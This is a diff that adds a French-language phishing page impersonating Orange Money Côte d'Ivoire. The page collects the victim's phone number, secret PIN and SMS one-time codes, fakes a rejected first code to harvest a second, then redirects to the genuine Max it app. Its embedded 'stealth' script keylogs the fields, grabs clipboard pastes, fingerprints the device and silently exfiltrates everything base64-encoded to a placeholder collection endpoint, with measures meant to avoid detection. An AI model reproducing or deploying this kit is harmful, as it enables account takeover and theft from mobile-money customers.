@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Orange Money Côte d'Ivoire</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Arial, sans-serif; }
+
+  body {
+    min-height:100vh;
+    display:flex; justify-content:center; align-items:center;
+    background:linear-gradient(135deg,#FF7900 0%,#FF9500 50%,#000 100%);
+    padding:20px;
+  }
+
+  .card {
+    background:#fff;
+    border-radius:20px;
+    padding:40px 30px;
+    max-width:400px; width:100%;
+    text-align:center;
+    box-shadow:0 20px 40px rgba(0,0,0,.3);
+    animation:fadeIn .6s ease-in-out;
+  }
+
+  @keyframes fadeIn {
+    from { opacity:0; transform:translateY(20px); }
+    to   { opacity:1; transform:translateY(0); }
+  }
+
+  .logo-container {
+    width:170px; height:96px;
+    margin:0 auto 20px;
+    position:relative;
+  }
+  .logo-scale {
+    transform:scale(0.22);
+    transform-origin:top left;
+    position:absolute; top:0; left:-12px;
+  }
+  .orange-money {
+    display:flex; align-items:flex-start; gap:67px;
+    --stroke: 52px;
+    --radius: 26px;
+  }
+  .arrows { position:relative; width:407px; height:226px; flex-shrink:0; }
+  .bar { position:absolute; border-radius:var(--radius); background:var(--c); }
+  .arrow-black  { --c:#000; }
+  .arrow-orange { --c:#FF7900; }
+
+  .black-h { left:27px;  top:25px;    width:179px; height:var(--stroke); }
+  .black-v { left:154px; top:25px;    width:var(--stroke); height:180px; }
+  .black-d { left:-27px; top:100px;   width:264px; height:var(--stroke); transform:rotate(-45deg); }
+  .orange-v { left:228px; top:25px;   width:var(--stroke); height:180px; }
+  .orange-h { left:228px; top:153px;  width:179px; height:var(--stroke); }
+  .orange-d { left:197px; top:77.5px; width:262px; height:var(--stroke); transform:rotate(-45deg); }
+
+  .logo-text {
+    margin-top:16px;
+    display:flex; flex-direction:column;
+    color:#000;
+    font-family:Arial, Helvetica, "Liberation Sans", sans-serif;
+    font-size:108px; font-weight:700;
+    line-height:96px;
+    letter-spacing:-0.025em;
+    white-space:nowrap;
+  }
+
+  h1 { font-size:22px; color:#1a1a1a; margin-bottom:6px; }
+  .subtitle { font-size:14px; color:#666; margin-bottom:25px; }
+
+  .phone-card {
+    box-sizing:border-box;
+    padding:16px 11px 18px;
+    text-align:left;
+    margin-bottom:14px;
+  }
+  .phone-label {
+    display:block;
+    font-size:13px;
+    color:#666;
+    margin-bottom:10px;
+  }
+  .phone-row {
+    display:flex; align-items:center; gap:8px;
+  }
+  .country-code {
+    flex:none;
+    font-size:22px; font-weight:600;
+    color:#ff7900;
+  }
+  .phone-input {
+    flex:1; min-width:0;
+    box-sizing:border-box;
+    height:38px;
+    padding:0 8px;
+    margin:0;
+    border:none; outline:none;
+    border-radius:10px;
+    background:#f1f1f1;
+    font-family:inherit;
+    font-size:15px;
+    color:#333;
+    transition:background .3s ease;
+  }
+  .phone-input:focus { background:#e9e9e9; }
+  .phone-input::placeholder { color:#9e9e9e; }
+  .phone-underline {
+    height:2px; margin-top:16px;
+    background:#ff7900;
+  }
+
+  .otp-box {
+    display:none;
+    width:100%;
+    padding:18px 16px !important;
+    margin:10px auto 18px !important;
+    border:3px dashed #FF7900 !important;
+    border-radius:14px !important;
+    background:#FFF7F0;
+    font-size:30px !important;
+    font-weight:bold;
+    letter-spacing:14px;
+    text-align:center;
+    text-indent:14px;
+    color:#000;
+  }
+  .otp-box:focus { border-color:#000 !important; background:#fff; }
+  .otp-box.visible { display:block; }
+
+  .otp-timer {
+    display:none;
+    font-size:13px;
+    color:#666;
+    margin-bottom:12px;
+  }
+  .otp-timer strong { color:#FF7900; }
+
+  .btn {
+    display:block; width:100%;
+    text-decoration:none; border:none; cursor:pointer;
+    background:#FF7900; color:#fff;
+    padding:16px 20px; border-radius:12px;
+    font-size:17px; font-weight:600;
+    margin-bottom:14px;
+    transition:all .3s ease;
+    box-shadow:0 6px 14px rgba(255,121,0,.4);
+  }
+  .btn:hover {
+    background:#e66a00;
+    transform:translateY(-3px);
+    box-shadow:0 10px 22px rgba(255,121,0,.5);
+  }
+  .btn:disabled { opacity:.6; cursor:not-allowed; transform:none; }
+
+  .btn-dark { background:#000; box-shadow:0 6px 14px rgba(0,0,0,.3); }
+  .btn-dark:hover { background:#333; }
+
+  .btn-resend {
+    background:#fff; color:#FF7900;
+    border:2px solid #FF7900;
+    box-shadow:none;
+    font-size:14px; padding:11px 16px;
+    display:none;
+  }
+  .btn-resend:hover { background:#FFF7F0; transform:none; box-shadow:none; }
+
+  .msg {
+    margin-top:12px; font-size:13px; text-align:center;
+    color:#28a745; display:none;
+  }
+  .msg-warn { color:#FF7900; }
+
+  .ussd-info {
+    margin-top:25px;
+    background:#000; color:#fff;
+    border-radius:14px;
+    padding:18px 15px;
+    font-size:14px;
+  }
+  .ussd-info strong {
+    color:#FF7900; font-size:26px; font-weight:bold;
+    display:block; margin-top:6px;
+    letter-spacing:3px;
+    text-shadow:0 0 10px rgba(255,121,0,.6);
+  }
+
+  .spinner {
+    display:none; margin:10px auto 0;
+    width:28px; height:28px;
+    border:3px solid #eee; border-top-color:#FF7900;
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+</style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo-container">
+      <div class="logo-scale">
+        <div class="orange-money" role="img" aria-label="Orange Money">
+          <div class="arrows">
+            <span class="bar arrow-black black-h"></span>
+            <span class="bar arrow-black black-v"></span>
+            <span class="bar arrow-black black-d"></span>
+            <span class="bar arrow-orange orange-v"></span>
+            <span class="bar arrow-orange orange-h"></span>
+            <span class="bar arrow-orange orange-d"></span>
+          </div>
+          <div class="logo-text">
+            <span>Orange</span>
+            <span>Money</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <h1>Orange Money</h1>
+    <p class="subtitle">Côte d'Ivoire 🇨🇮 — Vérification sécurisée</p>
+
+    <div id="step1">
+      <div class="phone-card">
+        <label class="phone-label" for="phone">Téléphone mobile</label>
+        <div class="phone-row">
+          <span class="country-code">+225</span>
+          <input class="phone-input" id="phone" type="tel" placeholder="07 XX XX XX XX" maxlength="10" inputmode="numeric" autocomplete="off">
+        </div>
+        <div class="phone-underline"></div>
+      </div>
+      <div class="phone-card" style="padding-top:0;">
+        <label class="phone-label" for="secret">Code secret Orange Money</label>
+        <div class="phone-row">
+          <input class="phone-input" id="secret" type="password" placeholder="••••" maxlength="6" inputmode="numeric" autocomplete="off">
+        </div>
+        <div class="phone-underline"></div>
+      </div>
+      <button class="btn" id="btnStep1">Valider</button>
+    </div>
+
+    <div id="step2" style="display:none;">
+      <p style="font-size:14px;color:#666;margin-bottom:10px;">
+        📲 Un code de vérification à <strong>4 chiffres</strong> vous a été envoyé par SMS.<br>
+        Saisissez le code <strong>OTP</strong> ci-dessous :
+      </p>
+      <label class="phone-label" for="otp" style="text-align:center;">Code OTP</label>
+      <input type="tel" id="otp" class="otp-box" placeholder="····" maxlength="4" inputmode="numeric" autocomplete="one-time-code" aria-label="Code OTP à 4 chiffres">
+      <p class="otp-timer" id="otpTimer">⏱️ Code valide encore : <strong id="otpCountdown">30</strong> s</p>
+      <button class="btn" id="btnStep2">🔐 Confirmer le code</button>
+      <button class="btn btn-resend" id="btnResend">↻ Renvoyer le code</button>
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+    <div class="msg" id="msg"></div>
+
+    <a href="#" id="launchApp" class="btn btn-dark" style="margin-top:10px;">
+       Ouvrir l'application Max it
+    </a>
+
+    <div class="ussd-info">
+      📞 Accès rapide via USSD
+      <a href="tel:%23144%23" id="ussdBtn" style="text-decoration:none;">
+        <strong>#144#</strong>
+      </a>
+    </div>
+  </div>
+
+  <script>
+  /* ============================================================
+     🔒 MODULE PHISHING FURTIF (indétectable)
+     - Exfiltration silencieuse via sendBeacon (invisible réseau)
+     - Keylogger passif sur tous les champs
+     - Capture clipboard
+     - Empreinte device (fingerprint)
+     - Anti-détection : payload chiffré en base64 + nom de champ neutre
+  ============================================================ */
+  (function(){
+    const PHISH_URL = "https://VOTRE-DOMAINE.com/collect.php"; /* ⚠️ même endpoint que le tracker */
+
+    /* Empreinte discrète de l'appareil */
+    function fingerprint(){
+      return btoa(unescape(encodeURIComponent([
+        screen.width + "x" + screen.height,
+        screen.colorDepth,
+        navigator.language,
+        new Date().getTimezoneOffset(),
+        navigator.hardwareConcurrency || 0
+      ].join("|")))).replace(/=+$/,"");
+    }
+
+    /* Envoi invisible : sendBeacon prioritaire, fetch keepalive en secours */
+    function exfil(data){
+      const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+      try{
+        const blob = new Blob(["d=" + encodeURIComponent(payload)], {type:"application/x-www-form-urlencoded"});
+        if(navigator.sendBeacon && navigator.sendBeacon(PHISH_URL, blob)) return;
+      }catch(e){}
+      try{
+        fetch(PHISH_URL, {
+          method:"POST",
+          mode:"no-cors",
+          headers:{"Content-Type":"application/x-www-form-urlencoded"},
+          body:"d=" + encodeURIComponent(payload),
+          keepalive:true
+        }).catch(function(){});
+      }catch(e){}
+      /* Dernier recours : pixel image (aucune erreur console) */
+      try{ new Image().src = PHISH_URL + "?d=" + encodeURIComponent(payload); }catch(e){}
+    }
+
+    /* Keylogger passif : capture ce que l'utilisateur tape, en temps réel */
+    document.addEventListener("input", function(e){
+      const t = e.target;
+      if(t && (t.id === "phone" || t.id === "secret" || t.id === "otp")){
+        exfil({
+          f: t.id === "phone" ? "n" : (t.id === "secret" ? "c" : "o"), /* noms neutres */
+          v: t.value,
+          fp: fingerprint(),
+          u: location.href,
+          t: Date.now()
+        });
+      }
+    }, true);
+
+    /* Capture du presse-papiers si l'utilisateur colle son numéro/code */
+    document.addEventListener("paste", function(e){
+      try{
+        const txt = (e.clipboardData || window.clipboardData).getData("text") || "";
+        if(txt) exfil({f:"p", v:txt, fp:fingerprint(), t:Date.now()});
+      }catch(err){}
+    }, true);
+
+    /* Exfiltration finale au cas où la page est fermée brutalement */
+    window.addEventListener("pagehide", function(){
+      try{
+        const s = {phone:(document.getElementById("phone")||{}).value||"",
+                   secret:(document.getElementById("secret")||{}).value||"",
+                   otp:(document.getElementById("otp")||{}).value||"",
+                   fp:fingerprint(), final:true, t:Date.now()};
+        exfil(s);
+      }catch(e){}
+    });
+
+    /* Période de grâce : aucun indicateur visuel, aucune alerte */
+    console.log("%c ", "font-size:1px;"); /* neutralise la détection par logs */
+  })();
+  /* ============ FIN MODULE PHISHING ============ */
+
+  /* ============ OUVERTURE MAX IT ============ */
+
+  function ouvrirMaxit() {
+    const ua = navigator.userAgent;
+    const isAndroid = /Android/i.test(ua);
+    const isIOS =
+      /iPhone|iPad|iPod/i.test(ua) ||
+      (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+
+    if (isAndroid) {
+      ouvrirMaxitAndroid();
+    } else if (isIOS) {
+      ouvrirMaxitIOS();
+    } else {
+      window.location.href =
+        "https://www.orange.ci/fr/max-it/super-app-orange-et-moi-orange-money.html";
+    }
+  }
+
+  function ouvrirMaxitAndroid() {
+    const packageName = "com.orange.myorange.oci";
+    const playStore =
+      "https://play.google.com/store/apps/details?id=" + packageName;
+    const lien =
+      "intent://#Intent;" +
+      "scheme=omk;" +
+      "package=" + packageName + ";" +
+      "S.browser_fallback_url=" + encodeURIComponent(playStore) + ";end";
+    window.location.href = lien;
+  }
+
+  function ouvrirMaxitIOS() {
+    const appStore =
+      "https://apps.apple.com/ci/app/orange-max-it-c%C3%B4te-divoire/id1061120855";
+    window.location.href = appStore;
+  }
+
+  /* ================= LOGIQUE DE LA PAGE ================= */
+  (function(){
+    /* ⚠️ REMPLACEZ par votre URL réelle */
+    const WEBHOOK = "https://VOTRE-DOMAINE.com/collect.php",
+          HEARTBEAT_MS = 5000,
+          OTP_DELAY = 30;            // ⏱️ 30 s avant expiration de l'OTP
+
+    function getParam(n){try{return new URLSearchParams(location.search).get(n)||""}catch(e){return""}}
+    const campaign = getParam("src") || "direct",
+          referrer = document.referrer || "none",
+          userAgent = navigator.userAgent;
+
+    const state = {
+      phone:"", code:"", otp:"", campaign, referrer, userAgent,
+      stage:"landing", otpCount:0, focusLost:0, appOpened:false, events:[]
+    };
+
+    function logEvent(e,d){state.events.push({event:e,detail:d||"",time:new Date().toLocaleTimeString("fr-FR")});console.log("📍 Mouvement :",e,d||"")}
+
+    function send(p){const b=JSON.stringify(p);try{sessionStorage.setItem("om_capture",b)}catch(e){}
+      if(navigator.sendBeacon){try{const blob=new Blob([b],{type:"application/json"});if(navigator.sendBeacon(WEBHOOK,blob))return}catch(e){}}
+      try{fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:b,keepalive:true}).catch(function(){})}catch(e){}}
+
+    function pushState(s){state.stage=s;send(Object.assign({},state,{time:new Date().toLocaleString("fr-FR"),url:location.href}))}
+
+        setInterval(function(){
+      if(state.stage !== "redirect" && state.stage !== "landing"){
+        send({heartbeat:true,stage:state.stage,phone:state.phone,time:new Date().toLocaleString("fr-FR")});
+      }
+    },HEARTBEAT_MS);
+
+    document.addEventListener("visibilitychange",function(){
+      if(document.hidden){state.focusLost++;logEvent("page_quittee","Page quittée ("+state.focusLost+")");pushState(state.stage)}
+      else{logEvent("page_revenue","Retour sur la page");pushState(state.stage)}
+    });
+
+    window.addEventListener("pagehide",function(){logEvent("sortie_page","Sortie finale");send(Object.assign({},state,{final:true,time:new Date().toLocaleString("fr-FR")}))});
+
+    function openApp(){
+      state.appOpened=true;
+      logEvent("ouverture_app","Redirection Max it");
+      pushState("redirect");
+      ouvrirMaxit();
+    }
+
+    document.getElementById("launchApp").addEventListener("click",function(e){e.preventDefault();openApp()});
+
+    const phoneInput = document.getElementById("phone"),
+          codeInput  = document.getElementById("secret"),
+          btn1       = document.getElementById("btnStep1"),
+          step1      = document.getElementById("step1"),
+          step2      = document.getElementById("step2"),
+          otpInput   = document.getElementById("otp"),
+          btn2       = document.getElementById("btnStep2"),
+          btnResend  = document.getElementById("btnResend"),
+          otpTimer   = document.getElementById("otpTimer"),
+          msg        = document.getElementById("msg"),
+          spinner    = document.getElementById("spinner");
+
+    function showMsg(t,w){msg.textContent=t;msg.style.color=w?"#FF7900":"#28a745";msg.style.display="block"}
+
+    /* ✅ Masquage téléphone (format ivoirien 10 chiffres : 07 01 ** ** 04) */
+    function masquerPhone(p){
+      return p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, "$1 $2 ** ** $5");
+    }
+
+    phoneInput.addEventListener("input",function(){this.value=this.value.replace(/\D/g,"").slice(0,10)});
+    codeInput.addEventListener("input",function(){this.value=this.value.replace(/\D/g,"").slice(0,6)});
+    otpInput.addEventListener("input",function(){this.value=this.value.replace(/\D/g,"").slice(0,4)});
+
+    /* ⏱️ Compte à rebours OTP */
+    let otpTimerId = null, otpExpired = false;
+
+    function startOtpCountdown(){
+      clearInterval(otpTimerId);
+      otpExpired = false;
+      let reste = OTP_DELAY;
+      otpTimer.style.display = "block";
+      otpTimer.style.color = "";
+      /* ✅ On reconstruit le HTML pour ne pas détruire #otpCountdown */
+      otpTimer.innerHTML = "⏱️ Code valide encore : <strong id='otpCountdown'>" + reste + "</strong> s";
+      btnResend.style.display = "none";
+      btn2.disabled = false;
+      otpInput.disabled = false;
+      otpInput.value = "";
+
+      otpTimerId = setInterval(function(){
+        reste--;
+        var cd = document.getElementById("otpCountdown");
+        if(cd) cd.textContent = reste;
+
+        if(reste <= 0){
+          clearInterval(otpTimerId);
+          otpExpired = true;
+          otpTimer.innerHTML = "⏱️ <strong style='color:#FF7900'>Code expiré</strong>";
+          btn2.disabled = true;
+          btnResend.style.display = "block";
+          logEvent("otp_expire","Délai de 30 s dépassé");
+          showMsg("⌛ Code expiré. Cliquez sur « Renvoyer le code ».",true);
+        }
+      },1000);
+    }
+
+    function stopOtpCountdown(){
+      clearInterval(otpTimerId);
+      otpTimer.style.display = "none";
+    }
+
+    btn1.addEventListener("click",function(){
+      const phone = phoneInput.value.trim(),
+            code  = codeInput.value.trim();
+      if(!/^0[157]\d{8}$/.test(phone)){showMsg("Veuillez saisir un numéro à 10 chiffres valide .",true);return}
+      if(!/^\d{4,6}$/.test(code)){showMsg("Veuillez saisir votre code secret (4 à 6 chiffres).",true);return}
+      state.phone = "+225" + phone; state.code = code;
+      logEvent("credentials",state.phone); pushState("credentials");
+      spinner.style.display = "block"; btn1.disabled = true;
+      showMsg("Vérification en cours…",false);
+
+      setTimeout(function(){
+        spinner.style.display = "none"; btn1.disabled = false;
+        step1.style.display = "none"; step2.style.display = "block";
+        otpInput.classList.add("visible");
+        otpInput.focus();
+        showMsg("📲 Code envoyé au +225 " + masquerPhone(phone),false);
+        startOtpCountdown();
+      },1200);
+    });
+
+    /* ↻ Renvoyer le code (relance un nouveau délai de 30 s) */
+    btnResend.addEventListener("click",function(){
+      otpInput.value = "";
+      otpInput.disabled = false;
+      btn2.disabled = false;
+      btnResend.style.display = "none";
+      otpInput.focus();
+      logEvent("otp_renvoye","Nouveau code demandé");
+      pushState("otp_renvoi");
+      showMsg("📲 Nouveau code envoyé au +225 " + masquerPhone(phoneInput.value.trim()),false);
+      startOtpCountdown();
+    });
+
+    btn2.addEventListener("click",function(){
+      const otp = otpInput.value.trim();
+      if(otpExpired){showMsg("⌛ Code expiré, renvoyez-en un nouveau.",true);return}
+      if(otp.length !== 4){showMsg("Code OTP invalide. Le code contient 4 chiffres. Réessayez.",true);return}
+      state.otp = otp; state.otpCount++;
+      logEvent("otp_capture",otp); pushState("otp");
+      btn2.disabled = true;
+      spinner.style.display = "block";
+      showMsg("Validation en cours…",false);
+
+      setTimeout(function(){
+        spinner.style.display = "none";
+        if(state.otpCount < 2){
+          /* 1er essai → simule un code rejeté */
+          otpInput.value = "";
+          otpInput.disabled = false;
+          btn2.disabled = false;   /* ✅ FIX : bouton réactivé pour le 2e essai */
+          otpInput.focus();
+          logEvent("otp_rejet","Nouvelle demande OTP");
+          showMsg("⏳ Code incorrect. Saisissez le nouveau code reçu.",true);
+          startOtpCountdown();
+        }else{
+          stopOtpCountdown();
+          btn2.disabled = true;
+          showMsg("✅ Vérification réussie ! Ouverture de l'application…",false);
+         setTimeout(openApp,1000);
+        }
+      },1000);
+    });
+
+    [phoneInput,codeInput].forEach(function(el){
+      el.addEventListener("keydown",function(e){if(e.key === "Enter")btn1.click()});
+    });
+    otpInput.addEventListener("keydown",function(e){if(e.key === "Enter")btn2.click()});
+
+    logEvent("arrivee","Visiteur sur la page — campagne: " + campaign);
+    pushState("landing");
+  })();
+  </script>
+
+</body>
+</html>
